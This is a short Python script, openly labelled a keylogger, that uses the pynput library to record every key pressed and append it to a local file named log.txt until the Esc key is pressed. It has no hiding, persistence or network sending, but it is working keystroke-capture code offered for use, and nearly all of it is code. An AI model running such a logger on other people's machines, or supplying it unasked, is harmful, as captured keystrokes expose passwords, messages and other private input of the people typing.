#import modules for keylogger
import pynput
from pynput.keyboard import Key, Listener

#creating a log file
log_file = open("log.txt", "w+")

#function to write to the log file
def write_to_log(key):
    #converting the key to string
    key = str(key)
    #writing to the log file
    log_file.write(key)
    log_file.write(" ")
    #flushing the log file
    log_file.flush()

#function to read the key
def read_key(key):
    #checking if the key is pressed
    if(key == Key.esc):
        #stopping the listener
        return False
    #writing to the log file
    write_to_log(key)

#starting the listener
with Listener(on_press=read_key) as listener:
    #listening to the keys
    listener.join()
#end of the program
